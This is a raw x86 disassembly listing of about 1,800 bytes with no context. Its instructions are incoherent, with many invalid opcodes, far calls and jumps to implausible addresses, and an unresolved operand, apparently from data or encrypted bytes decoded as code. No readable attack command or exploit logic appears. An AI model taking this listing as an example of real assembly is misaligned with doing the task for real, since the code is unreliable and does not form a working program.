  40ce10:	es sbb al,0xe8
  40ce13:	xchg   ebp,eax
  40ce14:	dec    edx
  40ce15:	xchg   esi,edi
  40ce17:	jo     0x40ce8f
  40ce19:	mov    BYTE PTR [edx+0x413c1fd4],cl
  40ce1f:	jmp    0x7d4113d6
  40ce24:	inc    esi
  40ce25:	cld    
  40ce26:	retf   0x73a5
  40ce29:	adc    al,0x57
  40ce2b:	add    DWORD PTR [eax+edi*1+0x0],edi
  40ce2f:	jmp    0x46b4226d
  40ce34:	add    BYTE PTR [eax],al
  40ce36:	cld    
  40ce37:	jnp    0x40ce12
  40ce39:	inc    ebp
  40ce3a:	pushf  
  40ce3b:	test   DWORD PTR [edx],ecx
  40ce3d:	test   eax,0x2488e11e
  40ce42:	int    0x85
  40ce44:	je     0x40ce07
  40ce46:	pop    eax
  40ce47:	sub    bh,bh
  40ce49:	xor    al,0x2d
  40ce4b:	jl     0x40cdd2
  40ce4d:	mov    dh,0xb5
  40ce4f:	test   esi,edi
  40ce51:	xor    al,0xad
  40ce53:	cld    
  40ce54:	sbb    esp,DWORD PTR [esi+0x20e81c1f]
  40ce5a:	pushf  
  40ce5b:	test   esi,edi
  40ce5d:	xchg   esi,eax
  40ce5e:	pop    ds
  40ce5f:	mov    WORD PTR [ecx-0x36],gs
  40ce62:	int    0xff
  40ce64:	pop    es
  40ce65:	add    al,al
  40ce67:	ss (bad) 
  40ce69:	(bad)  
  40ce6a:	fistp  QWORD PTR [edx]
  40ce6c:	fiadd  WORD PTR [ecx+ecx*1+0x10]
  40ce70:	push   DWORD PTR [ebp-0x40]
  40ce73:	mov    edx,0xa7cf5e73
  40ce78:	or     eax,eax
  40ce7a:	test   BYTE PTR fs:[esi-0x1],cl
  40ce7e:	push   ebp
  40ce7f:	stos   BYTE PTR es:[edi],al
  40ce80:	dec    esi
  40ce81:	inc    DWORD PTR ds:0x466ce81a
  40ce87:	test   al,0xfd
  40ce89:	call   0x4019d6
  40ce8e:	pop    edi
  40ce8f:	push   ds
  40ce90:	clc    
  40ce91:	call   0x401a16
  40ce96:	dec    esp
  40ce97:	fs mov esi,0x1f0000b9
  40ce9d:	test   al,0xfd
  40ce9f:	call   FWORD PTR [edx]
  40cea1:	div    DWORD PTR [esi]
  40cea3:	pop    es
  40cea4:	lds    ecx,FWORD PTR [ebp-0x57d38a03]
  40ceaa:	jae    0x40ceb4
  40ceac:	inc    eax
  40cead:	xchg   BYTE PTR [esi-0x1],dl
  40ceb0:	fisttp WORD PTR [ecx-0x37]
  40ceb3:	ret    0x11d4
  40ceb6:	push   ebp
  40ceb7:	mov    ebx,esp
  40ceb9:	test   eax,0xcae00c73
  40cebe:	pop    esp
  40cebf:	(bad)  
  40cec0:	fist   WORD PTR ds:0x399d74c0
  40cec6:	in     eax,dx
  40cec7:	inc    esp
  40cec8:	pop    ecx
  40cec9:	adc    BYTE PTR [eax-0x18],dl
  40cecc:	pop    ebx
  40cecd:	dec    edx
  40cece:	(bad)  
  40cecf:	(bad)  
  40ced0:	cmp    BYTE PTR [ecx-0x56d7ef8d],ch
  40ced6:	jae    0x40cee0
  40ced8:	mov    al,ds:0x9fffd486
  40cedd:	mov    eax,0x9e315a6c
  40cee2:	call   0xba55:0x26773c8
  40cee9:	lahf   
  40ceea:	xchg   bl,al
  40ceec:	pop    ecx
  40ceed:	push   ds
  40ceee:	cs add bl,cl
  40cef1:	rcr    BYTE PTR [ecx-0x756cc68c],0x56
  40cef8:	inc    esi
  40cef9:	out    dx,al
  40cefa:	mov    WORD PTR [ebp+edi*1+0x2],es
  40cefe:	fnstenv [eax+eax*1+0x0]
  40cf02:	or     DWORD PTR [edx+eax*1+0xe7b6e80],edi
  40cf09:	pop    ecx
  40cf0a:	cdq    
  40cf0b:	jecxz  0x40cf4c
  40cf0d:	inc    ecx
  40cf0e:	xor    DWORD PTR [esi+0x7b45d9aa],ebx
  40cf14:	add    cl,BYTE PTR [ebx]
  40cf16:	icebp  
  40cf17:	mov    esi,0x301956d6
  40cf1c:	daa    
  40cf1d:	(bad)  
  40cf1e:	inc    BYTE PTR [ecx-0xbbc8c3e]
  40cf24:	inc    eax
  40cf25:	clc    
  40cf26:	out    dx,al
  40cf27:	lahf   
  40cf28:	call   0xc908:0x110e4b69
  40cf2f:	in     al,dx
  40cf30:	call   0x5bf8:0xf7dd6fe
  40cf37:	push   edi
  40cf38:	cdq    
  40cf39:	je     0x40cf74
  40cf3b:	arpl   WORD PTR [ebx],bx
  40cf3d:	(bad)  
  40cf3e:	mov    esi,0xb9749965
  40cf43:	shl    dh,1
  40cf45:	(bad)  
  40cf46:	and    al,0x73
  40cf48:	stos   BYTE PTR es:[edi],al
  40cf49:	imul   esp,DWORD PTR [esi+0x24fe994d],0x53
  40cf50:	stos   BYTE PTR es:[edi],al
  40cf51:	std    
  40cf52:	clc    
  40cf53:	mov    ebp,0xbb42fb99
  40cf58:	pop    ebx
  40cf59:	inc    BYTE PTR [esi-0x7f6559ed]
  40cf5f:	mov    ch,0xe0
  40cf61:	add    bh,ah
  40cf63:	lods   al,BYTE PTR ds:[esi]
  40cf64:	xchg   ebp,eax
  40cf65:	adc    BYTE PTR [eax],al
  40cf67:	add    BYTE PTR [ebp-0x7c],ch
  40cf6a:	adc    ecx,DWORD PTR [ecx+ebx*2]
  40cf6d:	lock sbb eax,0xafe45f9b
  40cf73:	lds    esi,FWORD PTR [edx]
  40cf75:	adc    al,0x1c
  40cf77:	(bad)  
  40cf78:	pop    edx
  40cf79:	nop
  40cf7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf7b:	xchg   edi,eax
  40cf7c:	(bad)  
  40cf7e:	call   0xd3c5c9b0
  40cf83:	or     ecx,DWORD PTR [ecx+0xe]
  40cf86:	mov    esi,0xa38e2f9a
  40cf8b:	xchg   edi,eax
  40cf8c:	mov    ebx,0x71ebbc41
  40cf91:	adc    al,0x69
  40cf93:	ficom  DWORD PTR [esi]
  40cf95:	or     BYTE PTR [ecx-0x5826f6d5],ch
  40cf9b:	add    ebx,DWORD PTR [esi+0x6c]
  40cf9e:	mov    eax,0xf183fee7
  40cfa3:	ret    
  40cfa4:	xor    BYTE PTR [edi],0xbe
  40cfa7:	stos   DWORD PTR es:[edi],eax
  40cfa8:	arpl   di,si
  40cfaa:	or     eax,0x7c543b9a
  40cfaf:	cld    
  40cfb0:	outs   dx,BYTE PTR ds:[esi]
  40cfb1:	in     al,dx
  40cfb2:	call   0x810395ba
  40cfb7:	add    eax,0x33e8d574
  40cfbc:	(bad)  
  40cfbd:	or     ecx,esi
  40cfbf:	stos   DWORD PTR es:[edi],eax
  40cfc0:	push   ecx
  40cfc1:	add    bl,dh
  40cfc3:	cdq    
  40cfc4:	into   
  40cfc5:	xchg   ecx,eax
  40cfc6:	das    
  40cfc7:	cdq    
  40cfc8:	scas   eax,DWORD PTR es:[edi]
  40cfc9:	sbb    BYTE PTR [ecx],0xc4
  40cfcc:	add    BYTE PTR [eax],al
  40cfce:	jmp    0x9fda9556
  40cfd3:	xchg   BYTE PTR [esi+0x92fdc],cl
  40cfd9:	test   eax,0xaefc08a8
  40cfde:	ss or  al,0xe8
  40cfe1:	fwait
  40cfe2:	inc    ebx
  40cfe3:	cmp    esi,0x3e
  40cfe6:	push   0x55
  40cfe8:	add    ebp,ecx
  40cfea:	pop    ds
  40cfeb:	(bad)  
  40cfec:	jmp    0x40d058
  40cfee:	jno    0x40d06b
  40cff0:	add    ah,0xfc
  40cff3:	xor    BYTE PTR [ecx-0x17],al
  40cff6:	xor    cl,BYTE PTR [ecx]
  40cff8:	add    al,0xa0
  40cffa:	ja     0x40d00b
  40cffc:	add    BYTE PTR [ebx],al
  40cffe:	sub    eax,0x99d2ffee
  40d003:	xor    BYTE PTR [ebp+ebp*8+0x4],0x14
  40d008:	push   0xffffffe9
  40d00a:	fidivr DWORD PTR [eax]
  40d00c:	sub    ebp,ecx
  40d00e:	xor    cl,BYTE PTR [ebp+0x7b84144]
  40d014:	clc    
  40d015:	push   ecx
  40d016:	arpl   bp,bx
  40d018:	(bad)  
  40d019:	ss mov edx,0x362efbd7
  40d01f:	jl     0x40d01f
  40d021:	pushf  
  40d022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d023:	in     al,dx
  40d024:	(bad)  
  40d025:	push   ds
  40d026:	adc    BYTE PTR es:[edx-0x17],ch
  40d02a:	sbb    al,0x14
  40d02c:	call   0xfec3a616
  40d031:	je     0x40d033
  40d033:	add    BYTE PTR [esi],bl
  40d035:	mov    BYTE PTR [edi-0x6d],cl
  40d038:	xor    ch,dh
  40d03a:	inc    DWORD PTR [edx-0x1200133c]
  40d040:	aaa    
  40d041:	cmp    dh,0xfc
  40d044:	pop    esp
  40d045:	xor    DWORD PTR [ecx-0x17],eax
  40d048:	aaa    
  40d049:	ret    
  40d04a:	push   cs
  40d04b:	popa   
  40d04c:	mov    edx,0xb5e9fe82
  40d051:	out    0xf3,eax
  40d053:	add    BYTE PTR [ebx],ah
  40d055:	mov    DWORD PTR [ebx+0x6a46d845],ecx
  40d05b:	add    dl,dh
  40d05d:	mov    DWORD PTR [eax+0x0],ebp
  40d060:	lock je 0x40d0a6
  40d063:	inc    ecx
  40d064:	mov    BYTE PTR [ebx+0x4897f473],bl
  40d06a:	adc    BYTE PTR [ebp-0xa0e168],al
  40d070:	cmp    eax,0x38abe6a8
  40d075:	popf   
  40d076:	std    
  40d077:	mov    DWORD PTR ds:0x4cc009b0,ecx
  40d07d:	into   
  40d07e:	(bad)  
  40d07f:	jne    0x40d031
  40d081:	scas   al,BYTE PTR es:[edi]
  40d082:	jmp    0x40d0dc
  40d084:	xlat   BYTE PTR ds:[ebx]
  40d085:	fwait
  40d086:	xchg   DWORD PTR [ebp-0x1c],eax
  40d089:	fwait
  40d08a:	jae    0x40d07c
  40d08c:	jo     0x40d075
  40d08e:	push   eax
  40d08f:	push   DWORD PTR [edi-0x64]
  40d092:	jae    0x40d07c
  40d094:	ja     0x40d0a8
  40d096:	in     al,dx
  40d097:	inc    DWORD PTR [eax]
  40d099:	add    ch,bl
  40d09b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d09c:	out    0x2c,al
  40d09e:	test   eax,0x580bfd9c
  40d0a3:	adc    DWORD PTR [ebx],ebx
  40d0a5:	push   0xbeef1608
  40d0aa:	pop    ss
  40d0ab:	adc    cl,BYTE PTR [eax]
  40d0ad:	call   0x4003bf
  40d0b2:	aaa    
  40d0b3:	adc    ch,al
  40d0b5:	call   FWORD PTR [ebp-0x47]
  40d0b8:	std    
  40d0b9:	jne    0x40d09b
  40d0bb:	lods   eax,DWORD PTR ds:[esi]
  40d0bc:	pop    ebx
  40d0bd:	push   ebp
  40d0be:	(bad)  
  40d0bf:	test   eax,0xaec475fd
  40d0c4:	xchg   esp,eax
  40d0c5:	pop    eax
  40d0c6:	xlat   BYTE PTR ds:[ebx]
  40d0c7:	test   eax,0xb0d875fd
  40d0cc:	stc    
  40d0cd:	dec    edi
  40d0ce:	xor    DWORD PTR [edx-0x6a],ebp
  40d0d1:	mov    bh,ah
  40d0d3:	data16 mov dl,BYTE PTR [ecx]
  40d0d6:	sahf   
  40d0d7:	inc    eax
  40d0d8:	nop
  40d0d9:	inc    BYTE PTR [ebx]
  40d0db:	adc    DWORD PTR [ebp+0x1a538d74],0x58
  40d0e2:	xchg   BYTE PTR [edx+0x6b2dc1cc],dh
  40d0e8:	das    
  40d0e9:	mov    eax,DWORD PTR [ebp+0x590c10a2]
  40d0ef:	out    0x37,al
  40d0f1:	jmp    DWORD PTR [esi+0x76]
  40d0f4:	ret    0x873
  40d0f7:	and    ecx,DWORD PTR [eax]
  40d0f9:	inc    ebp
  40d0fa:	lock push 0x32
  40d0fd:	call   0x2721d102
  40d102:	xchg   edi,eax
  40d103:	(bad)  
  40d104:	loope  0x40d118
  40d106:	inc    ebp
  40d107:	mov    edi,0x2a6af1
  40d10c:	xor    edx,edx
  40d10e:	push   ebp
  40d10f:	addr16 push ebx
  40d111:	mov    al,0x43
  40d113:	add    BYTE PTR [ecx+0x90810d2],al
  40d119:	arpl   WORD PTR [ecx],bx
  40d11b:	call   DWORD PTR [esi]
  40d11d:	jecxz  0x40d0f5
  40d11f:	push   edi
  40d120:	push   cs
  40d121:	dec    edx
  40d122:	xchg   edi,eax
  40d123:	je     0x40d15a
  40d125:	sar    DWORD PTR [ebp+0x5b],cl
  40d128:	(bad)  
  40d129:	cmp    DWORD PTR [ebx],ecx
  40d12b:	sar    BYTE PTR [ebp+0x64],0x2a
  40d12f:	adc    esi,DWORD PTR [esp+ebp*4+0x2]
  40d133:	push   eax
  40d134:	fld    DWORD PTR [ebp-0x652100ca]
  40d13a:	sub    al,BYTE PTR [ecx-0x6a]
  40d13d:	stos   BYTE PTR es:[edi],al
  40d13e:	add    ch,BYTE PTR [eax+0x31]
  40d141:	imul   esp,DWORD PTR [ebp+0x3f4d59bd],0x41
  40d148:	xor    DWORD PTR [ecx+edi*1],edx
  40d14b:	xchg   edi,eax
  40d14c:	cmp    eax,0x2bd2d10c
  40d151:	adc    ebp,0xcddc38ab
  40d157:	xchg   esi,eax
  40d158:	imul   edx,DWORD PTR [ebp-0x10],0xcc8cfc03
  40d15f:	xor    BYTE PTR [edx+0x7f],0x42
  40d163:	add    al,0x0
  40d165:	add    BYTE PTR [ebx],bl
  40d167:	inc    eax
  40d168:	scas   al,BYTE PTR es:[edi]
  40d169:	adc    BYTE PTR [ecx],ch
  40d16b:	ins    BYTE PTR es:[edi],dx
  40d16c:	aam    0x30
  40d16e:	jbe    0x40d0f0
  40d170:	outs   dx,DWORD PTR ds:[esi]
  40d171:	inc    eax
  40d172:	ins    DWORD PTR es:[edi],dx
  40d173:	in     eax,dx
  40d174:	repnz xchg esi,eax
  40d176:	fisttp QWORD PTR [ebx]
  40d178:	adc    DWORD PTR [ebx],0x2985805e
  40d17e:	adc    al,BYTE PTR [ecx-0x6a6f40d]
  40d184:	jne    0x40d11c
  40d186:	inc    edi
  40d187:	in     eax,dx
  40d188:	int3   
  40d189:	xchg   esi,eax
  40d18a:	lds    ecx,FWORD PTR [ebx]
  40d18c:	push   ecx
  40d18d:	aaa    
  40d18e:	sbb    BYTE PTR ss:[ebp-0x6a],0xa5
  40d193:	adc    BYTE PTR [ebp+0x10],0x39
  40d197:	ins    BYTE PTR es:[edi],dx
  40d198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d199:	xor    BYTE PTR [esi],bl
  40d19b:	sub    BYTE PTR [edi],0xc1
  40d19e:	xor    dl,BYTE PTR [esp+edx*4]
  40d1a1:	mov    bl,BYTE PTR [edx]
  40d1a3:	cmp    BYTE PTR [ebx-0x72f2e6f9],0x96
  40d1aa:	dec    DWORD PTR [ebx]
  40d1ac:	sub    DWORD PTR [edi],ecx
  40d1ae:	dec    ebp
  40d1af:	in     al,dx
  40d1b0:	fild   WORD PTR [eax+0x70]
  40d1b3:	adc    al,0xb9
  40d1b5:	stos   DWORD PTR es:[edi],eax
  40d1b6:	(bad)
  40d1b9:	xchg   esi,eax
  40d1ba:	outs   dx,BYTE PTR ds:[esi]
  40d1bb:	in     al,dx
  40d1bc:	call   0x90ff97c4
  40d1c1:	inc    edi
  40d1c2:	je     0x40d199
  40d1c4:	(bad)  
  40d1c5:	call   0xe1b550cc
  40d1ca:	add    BYTE PTR [eax],al
  40d1cc:	mov    bh,al
  40d1ce:	jnp    0x40d1b6
  40d1d0:	pushf  
  40d1d1:	ja     0x40d163
  40d1d3:	les    edi,FWORD PTR ss:[esi-0x38]
  40d1d7:	stos   DWORD PTR es:[edi],eax
  40d1d8:	xor    eax,0xc9625514
  40d1dd:	xchg   edx,eax
  40d1de:	ret    
  40d1df:	lds    ecx,FWORD PTR [ebx+0x14]
  40d1e2:	push   0xfffffffc
  40d1e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1e5:	or     BYTE PTR [eax],cl
  40d1e7:	shl    eax,0xe2
  40d1ea:	(bad)  
  40d1eb:	scas   al,BYTE PTR es:[edi]
  40d1ec:	stos   BYTE PTR es:[edi],al
  40d1ed:	fdivr  st,st(3)
  40d1ef:	adc    edi,DWORD PTR [ebx+0x7e]
  40d1f2:	je     0x40d1e5
  40d1f4:	call   0x22ed:0xbc96fead
  40d1fb:	mov    gs,WORD PTR [esi]
  40d1fd:	or     al,0xe8
  40d1ff:	dec    ecx
  40d200:	mov    esp,0x4913fe7e
  40d205:	jle    0x40d27b
  40d207:	loope  0x40d1a3
  40d209:	test   eax,0x7ea46efe
  40d20e:	je     0x40d275
  40d210:	pushf  
  40d211:	or     BYTE PTR [eax],cl
  40d213:	push   ecx
  40d214:	mul    dl
  40d216:	(bad)  
  40d217:	push   esi
  40d218:	cli    
  40d219:	push   esp
  40d21a:	add    ebp,ecx
  40d21c:	dec    edi
  40d21d:	mov    ebp,ebx
  40d21f:	push   0xfffffff1
  40d221:	xchg   BYTE PTR [esi-0x2d],dl
  40d224:	xor    ch,dl
  40d226:	cmp    eax,0xe80c3636
  40d22b:	mov    ecx,0x70fe7f4e
  40d230:	add    BYTE PTR [eax],al
  40d232:	or     BYTE PTR ss:[edx+0x412c3fdc],0xe9
  40d23a:	mov    dl,0x3d
  40d23c:	add    BYTE PTR [ebp+0x53ec1d],dl
  40d242:	test   ecx,edx
  40d244:	call   DWORD PTR [esi+0x20]
  40d247:	frstor [edi]
  40d249:	add    al,bl
  40d24b:	or     eax,eax
  40d24d:	je     0x40d241
  40d24f:	das    
  40d250:	call   0xfdea3b33
  40d255:	or     ebx,eax
  40d257:	push   cs
  40d258:	and    BYTE PTR [ecx+0x66a055],cl
  40d25e:	mov    BYTE PTR [edi+0x3f4d68bc],dh
  40d264:	inc    ecx
  40d265:	add    bh,cl
  40d267:	or     eax,0x1045fff8
  40d26c:	call   0xfdea1639
  40d271:	call   DWORD PTR ds:0x26f1e6a0
  40d277:	test   eax,0x528bfcfd
  40d27c:	mov    bh,0xff
  40d27e:	scas   eax,DWORD PTR es:[edi]
  40d27f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d280:	std    
  40d281:	repnz (bad) 
  40d283:	pop    edx
  40d284:	add    eax,0x73a7f175
  40d289:	cld    
  40d28a:	mov    edi,0x26e8080d
  40d28f:	inc    esp
  40d290:	(bad)  
  40d291:	jmp    FWORD PTR [edi+0x49]
  40d294:	rol    BYTE PTR [eax+eax*1],0x0
  40d298:	sbb    BYTE PTR [edi],ch
  40d29a:	mov    ebp,esp
  40d29c:	fwait
  40d29d:	mov    ebp,0x11f257e2
  40d2a2:	push   0x3f
  40d2a4:	outs   dx,DWORD PTR ds:[esi]
  40d2a5:	push   cs
  40d2a6:	or     al,ch
  40d2a8:	jo     0x40d2ee
  40d2aa:	(bad)  
  40d2ab:	call   DWORD PTR [ecx+0xd8bfc3e]
  40d2b1:	movaps xmm0,XMMWORD PTR [ecx+0x8]
  40d2b5:	xchg   edx,eax
  40d2b6:	cmp    eax,0x6840c400
  40d2bb:	bound  esi,QWORD PTR [ecx]
  40d2bd:	mov    al,0x41
  40d2bf:	add    BYTE PTR [esi+0x31294013],al
  40d2c5:	imul   eax,DWORD PTR [edi],0xffffffc0
  40d2c8:	inc    ebp
  40d2c9:	popa   
  40d2ca:	sub    ebp,eax
  40d2cc:	dec    edi
  40d2cd:	mov    edx,DWORD PTR [ebx+0xf2b2afe]
  40d2d3:	and    BYTE PTR [eax+0x31678c30],ch
  40d2d9:	imul   esp,DWORD PTR [ecx+0x48d219bd],0x41
  40d2e0:	xor    DWORD PTR [esi+0x18],ecx
  40d2e3:	clc    
  40d2e4:	xchg   esi,eax
  40d2e5:	inc    eax
  40d2e6:	cld    
  40d2e7:	out    0xe1,eax
  40d2e9:	rcl    DWORD PTR [edx-0x73bf7902],1
  40d2ef:	out    0xf8,eax
  40d2f1:	and    al,0x93
  40d2f3:	(bad)  
  40d2f4:	jne    0x40d350
  40d2f6:	ret    0x6eb8
  40d2f9:	sahf   
  40d2fa:	xchg   edx,eax
  40d2fb:	inc    BYTE PTR [eax]
  40d2fd:	add    BYTE PTR [ebx-0x2b],ah
  40d300:	retf   
  40d301:	push   es
  40d302:	in     al,0xe3
  40d304:	sbb    eax,DWORD PTR [eax]
  40d306:	xor    DWORD PTR [esi+0x37da6751],esp
  40d30c:	inc    ebp
  40d30d:	add    cl,bl
  40d30f:	scas   al,BYTE PTR es:[edi]
  40d310:	dec    eax
  40d311:	inc    ecx
  40d312:	xor    esi,ebp
  40d314:	sbb    BYTE PTR [eax],cl
  40d316:	dec    ecx
  40d317:	gs or  eax,0x2612eff
  40d31d:	push   0x43b09d
  40d322:	mov    esi,ebp
  40d324:	dec    eax
  40d325:	inc    ecx
  40d326:	xor    esi,edx
  40d328:	fcomp  DWORD PTR [ebx+0x58]
  40d32b:	lods   al,BYTE PTR ds:[esi]
  40d32c:	add    ch,al
  40d32e:	pop    esp
  40d32f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d330:	xchg   ecx,eax
  40d331:	(bad)  
  40d332:	test   al,0xb7
  40d334:	sahf   
  40d335:	imul   esi,DWORD PTR [ecx],0x75849114
  40d33b:	shr    eax,cl
  40d33d:	sbb    eax,esi
  40d33f:	(bad)  
  40d340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d341:	add    ebx,esi
  40d343:	inc    esi
  40d344:	lods   eax,DWORD PTR ds:[esi]
  40d345:	fdiv   QWORD PTR [ecx+0x14]
  40d348:	adc    edi,ecx
  40d34a:	imul   edi,DWORD PTR [ebp-0x3],0x82886d7c
  40d351:	add    ecx,DWORD PTR [ecx-0x71]
  40d354:	mov    ds:0x85ec3144,eax
  40d359:	dec    eax
  40d35a:	lock adc ebx,esi
  40d35d:	fmul   DWORD PTR [edx]
  40d35f:	sub    ebp,DWORD PTR [eax]
  40d361:	add    al,0x0
  40d363:	add    BYTE PTR [ecx-0x686ccfce],cl
  40d369:	mov    ch,BYTE PTR [ebx]
  40d36b:	xchg   esp,eax
  40d36c:	mov    ebp,0x1933c4d6
  40d371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d372:	sub    eax,DWORD PTR [ebp+0x31]
  40d375:	in     al,dx
  40d376:	dec    ebp
  40d377:	dec    eax
  40d378:	lock adc esp,DWORD PTR [esi+0x282b0ad8]
  40d37f:	add    al,0x59
  40d381:	push   ss
  40d382:	xor    BYTE PTR [ebx-0x63dc75a1],dl
  40d388:	mov    bl,0xfe
  40d38a:	jl     0x40d38f
  40d38c:	(bad)
  40d38f:	adc    BYTE PTR [ecx+0x13],al
  40d392:	std    
  40d393:	inc    ebp
  40d394:	mov    dl,0xfe
  40d396:	jl     0x40d39b
  40d398:	mov    ebp,0x3104d13f
  40d39d:	imul   ebx,DWORD PTR [esi+0x410c9d92],0x37
  40d3a4:	cmp    DWORD PTR [ebx+0x4d],0xffffff92
  40d3a8:	popf   
  40d3a9:	add    BYTE PTR [ebp+0x18],0x39
  40d3ad:	ins    BYTE PTR es:[edi],dx
  40d3ae:	xchg   ecx,eax
  40d3af:	xor    eax,0x35ff7c06
  40d3b4:	sbb    DWORD PTR [esi+edi*8-0x608c054c],eax
  40d3bb:	mov    ebx,0x94fe7ac3
  40d3c0:	(bad)  
  40d3c1:	jp     0x40d437
  40d3c3:	loope  0x40d37f
  40d3c5:	mov    al,ds:0xe51
  40d3ca:	ret    
  40d3cb:	jp     0x40d441
  40d3cd:	or     eax,0xfee800a3
  40d3d2:	push   ds
  40d3d3:	or     al,0xe8
  40d3d5:	xchg   edx,eax
  40d3d6:	add    al,0x7b
  40d3d8:	(bad)  
  40d3d9:	out    dx,al
  40d3da:	push   ds
  40d3db:	push   0x7b667de7
  40d3e0:	(bad)  
  40d3e1:	fidivr WORD PTR [esi]
  40d3e3:	and    bh,0x65
  40d3e6:	data16 jnp 0x40d3e7
  40d3e9:	into   
  40d3ea:	ds test bh,ah
  40d3ed:	ins    DWORD PTR es:[edi],dx
  40d3ee:	inc    esi
  40d3ef:	jnp    0x40d3ef
  40d3f1:	mov    esi,0x35e76c1e
  40d3f6:	inc    esi
  40d3f7:	jnp    0x40d3f7
  40d3f9:	scas   al,BYTE PTR es:[edi]
  40d3fa:	push   ds
  40d3fb:	js     0x40d3fb
  40d3fd:	sbb    al,0x6d
  40d3ff:	jae    0x40d3ef
  40d401:	cmp    eax,eax
  40d403:	jp     0x40d463
  40d405:	mov    al,ds:0x34001777
  40d40a:	aam    0x6e
  40d40c:	sub    BYTE PTR [ebp+0x12ffeda1],0xed
  40d413:	jp     0x40d489
  40d415:	loope  0x40d3b1
  40d417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d418:	push   ecx
  40d419:	outs   dx,BYTE PTR ds:[esi]
  40d41a:	mov    al,ds:0x4f65448c
  40d41f:	adc    al,0x6a
  40d421:	jmp    0xa8853b70
  40d426:	xor    ch,ah
  40d428:	(bad)  
  40d429:	call   0x1286860
  40d42e:	add    BYTE PTR [eax],al
  40d430:	aam    0x2e
  40d432:	(bad)  
  40d433:	inc    DWORD PTR [ebx]
  40d435:	push   edi
  40d436:	jb     0x40d45b
  40d438:	cwde   
  40d439:	sahf   
  40d43a:	add    DWORD PTR [edi+0x47],ebx
  40d43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d43e:	or     eax,eax
  40d440:	int3   
  40d441:	ins    DWORD PTR es:[edi],dx
  40d442:	dec    esi
  40d443:	push   0xbeef16d8
  40d448:	mov    al,0x54
  40d44a:	inc    ebx
  40d44b:	inc    ecx
  40d44c:	enter  0xff46,0x75
  40d450:	rcr    BYTE PTR [esi-0x5c388611],0xe6
  40d457:	sbb    eax,0xfffda39d
  40d45c:	cmp    eax,0xa075fd8b
  40d461:	sahf   
  40d462:	mov    ss,WORD PTR [edx-0x79]
  40d465:	mov    ds:0x168cc2c7,eax
  40d46a:	push   ebp
  40d46b:	mov    edx,esp
  40d46d:	pop    edx
  40d46f:	cld    
  40d470:	das    
  40d471:	sbb    al,BYTE PTR [eax]
  40d473:	push   0x59
  40d475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d476:	jae    0x40d480
  40d478:	jo     0x40d4d9
  40d47a:	push   eax
  40d47b:	inc    edi
  40d47d:	std    
  40d47e:	inc    ebx
  40d47f:	cld    
  40d480:	jecxz  0x40d4cb
  40d482:	jae    0x40d4ac
  40d484:	sbb    DWORD PTR [eax],edx
  40d486:	cmp    BYTE PTR [edi],0x48
  40d489:	and    al,BYTE PTR [eax+0x68]
  40d48c:	mov    ecx,0x2f0040d1
  40d491:	cwde   
  40d492:	jl     0x40d4bb
  40d494:	add    BYTE PTR [eax],al
  40d496:	pop    eax
  40d497:	push   ss
  40d498:	or     eax,eax
  40d49a:	cmp    al,0x6f
  40d49c:	push   ebp
  40d49d:	call   0x40198b
  40d4a2:	and    edx,DWORD PTR [esi+0x72]
  40d4a5:	sbb    eax,ebp
  40d4a7:	sbb    eax,0xd2310000
  40d4ac:	push   eax
  40d4ad:	addr16 push ds
  40d4af:	mov    cl,0x41
  40d4b1:	add    BYTE PTR [ecx-0x2e],ah
  40d4b4:	adc    eax,0x9eb1908
  40d4b9:	(bad)  
  40d4ba:	(bad)  
  40d4bb:	ror    DWORD PTR [ebx+0x53],cl
  40d4be:	imul   BYTE PTR [edx]
  40d4c0:	(bad)  
  40d4c1:	xor    dh,cl
  40d4c3:	hlt    
  40d4c4:	(bad)  
  40d4c5:	(bad)  
  40d4c6:	out    0x1a,al
  40d4c8:	xchg   ebp,eax
  40d4c9:	lods   eax,DWORD PTR ds:[esi]
  40d4ca:	sbb    DWORD PTR [edx+0x15],ebp
  40d4cd:	rcl    dh,0xa0
  40d4d0:	mov    ?,esi
  40d4d2:	inc    esp
  40d4d3:	sbb    DWORD PTR [edx-0x71859ce1],0x5e
  40d4da:	call   0x5c40dc0c
  40d4df:	neg    BYTE PTR [esi+0x366f7582]
  40d4e5:	push   0x31
  40d4e7:	in     eax,0x41
  40d4e9:	jmp    DWORD PTR [ebx+esi*2]
  40d4ec:	call   0xf488:0x8e4a00c1
  40d4f3:	dec    esi
  40d4f4:	jp     0x40d532
  40d4f6:	cld    
  40d4f7:	and    al,BYTE PTR [ebp+0x0]
  40d4fa:	add    BYTE PTR [eax],al
  40d4fc:	mov    cl,0x82
  40d4fe:	add    dh,BYTE PTR [ecx+esi*8-0x2e]
  40d502:	push   es
  40d503:	inc    esi
  40d504:	lock push 0x35
  40d507:	call   0x432740
  40d50c:	sub    ch,BYTE PTR [ebx-0x6d01dce9]
  40d512:	rcr    DWORD PTR [ebp+0x4e],cl
  40d515:	xchg   edx,eax
  40d516:	cli    
  40d517:	mov    edi,0x683273bd
  40d51c:	xor    DWORD PTR [ebx-0x63],ebp
  40d51f:	mov    ebp,0x414458c9
  40d524:	xor    DWORD PTR [ecx+edi*4],edx
  40d527:	mov    ds,WORD PTR [ebp-0x6611aef4]
  40d52d:	jns    0x40d584
  40d52f:	pushf  
  40d530:	push   0xa8f4de0
  40d535:	inc    ebp
  40d536:	sub    DWORD PTR [ebp+0x7],ecx
  40d539:	jns    0x40d578
  40d53b:	pop    DWORD PTR [eax]
  40d53d:	stos   BYTE PTR es:[edi],al
  40d53e:	lock push es
  40d540:	jl     0x40d596
  40d542:	ret    0xd6e2
  40d545:	pop    eax
  40d547:	mov    fs,edi
  40d549:	or     al,0x29
  40d54b:	sbb    BYTE PTR ds:0x7045f0ec,dl
  40d551:	adc    al,0xb9
  40d553:	fwait
  40d554:	sub    esp,ebx
  40d556:	add    eax,0xe8ec768f
  40d55b:	add    ecx,esi
